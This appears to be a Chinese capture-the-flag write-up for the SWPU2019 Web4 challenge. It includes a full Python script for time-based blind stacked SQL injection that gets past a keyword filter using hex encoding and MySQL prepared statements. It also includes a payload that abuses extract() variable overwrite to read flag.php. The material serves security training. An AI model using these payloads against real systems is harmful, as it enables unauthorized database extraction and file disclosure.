---
title: '[SWPU2019]Web4'
date: 2024-09-08 19:55:26
tags: 
      - sql注入
      - json
categories: 刷题笔记
---

### [SWPU2019]Web4

打开页面发现一个登录框，输入账号和密码后没有反应

我们f12打开页面源码，发现js代码

![image-20240908201027925](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409082010079.png)

js主要功能是将username和password以json格式然后发给index.php?r=Login/Login。

我们进行抓包

<!--more-->

我们不难发现username中加入单引号会报错，但在单引号后加上分号就不会了，这个情况我们考虑堆叠注入

![image-20240908201554679](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409082015802.png)

由于过滤了select,if,sleep,substr等大多数注入常见的单词，但是注入又不得不使用其中的某些单词。那么在这里我们就可以用16进制+mysql预处理来绕过。

预制语句的SQL语法基于三个SQL语句：

```
set @a="xxx"
prepare stmt_name from preparable_stmt;
execute stmt_name [using @var_name [, @var_name] ...];
{deallocate | drop} prepare stmt_name;
```

![image-20240908202346119](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409082023210.png)

我们找个脚本来进行提交

```
#author: c1e4r
import requests
import json
import time

def main():
    #题目地址
    url = '''http://568215bc-57ff-4663-a8d9-808ecfb00f7f.node3.buuoj.cn/index.php?r=Login/Login'''
    #注入payload
    payloads = "asd';set @a=0x{0};prepare ctftest from @a;execute ctftest-- -"
    flag = ''
    for i in range(1,30):
        #查询payload
        payload = "select if(ascii(substr((select flag from flag),{0},1))={1},sleep(3),1)"
        for j in range(0,128):
            #将构造好的payload进行16进制转码和json转码
            datas = {'username':payloads.format(str_to_hex(payload.format(i,j))),'password':'test213'}
            data = json.dumps(datas)
            times = time.time()
            res = requests.post(url = url, data = data)
            if time.time() - times >= 3:
                flag = flag + chr(j)
                print(flag)
                break

def str_to_hex(s):
    return ''.join([hex(ord(c)).replace('0x', '') for c in s])

if __name__ == '__main__':
    main()

```

前端应用逻辑的基础在controller文件夹下面，而其他文件都是基于basecontroller.php，所以我们打开basecontroller.php文件进行代码审计

```
 /Controller/BaseController.php
....
public function loadView($viewName ='', $viewData = [])
{
   $this->viewPath = BASE_PATH . "/View/{$viewName}.php";
   if(file_exists($this->viewPath))
   {
      extract($viewData);
      include $this->viewPath;
   }
}

```

`extract` 传入 `viewdata` 数组造成变量覆盖，发现利用 `loadView` 方法的并且第二个元素可控的地方只有 `UserController.php`

```
/Controller/UserController.php
public function actionIndex()
{
    $listData = $_REQUEST;
    $this->loadView('userIndex',$listData);
}

```

$listData是从REQUEST提取出来的，完全可控。而其对应的/View/userIndex.php中存在一个文件读取

```
.......
                if(!isset($img_file)) {
                    $img_file = '/../favicon.ico';
                }
                $img_dir = dirname(__FILE__) . $img_file;
                $img_base64 = imgToBase64($img_dir);
                echo '<img src="' . $img_base64 . '">';       //图片形式展示
                ?></div>
        </div>
    </div>
</div>
</body>
</html>
<?php
function imgToBase64($img_file) {
                return $img_base64; //返回图片的base64
}
?>

```

这里的$img_file的值可利用前面的逻辑进行覆盖，传入img_file=./../flag.php即可,而有英文下面的路由控制

```
// 路由控制跳转至控制器
if(!empty($_REQUEST['r']))
{
    $r = explode('/', $_REQUEST['r']);
    list($controller,$action) = $r;
    $controller = "{$controller}Controller";
    $action = "action{$action}";


    if(class_exists($controller))
    {
        if(method_exists($controller,$action))
        {
            //
        }
        else
        {
            $action = "actionIndex";
        }
    }
    else
    {
        $controller = "LoginController";
        $action = "actionIndex";
    }
    $data = call_user_func(array( (new $controller), $action));
} else {
    header("Location:index.php?r=Login/Index");
}
```

上面可以知道我们传入的路由 r-User/Index

我们构造payload

GET：index.php?r=User/Index

POST: img_file=/../flag.php

![image-20240908204651640](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409082046709.png)

我们发现图片url里含有个base64解码

得到flag

![image-20240908204740143](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409082047177.png)
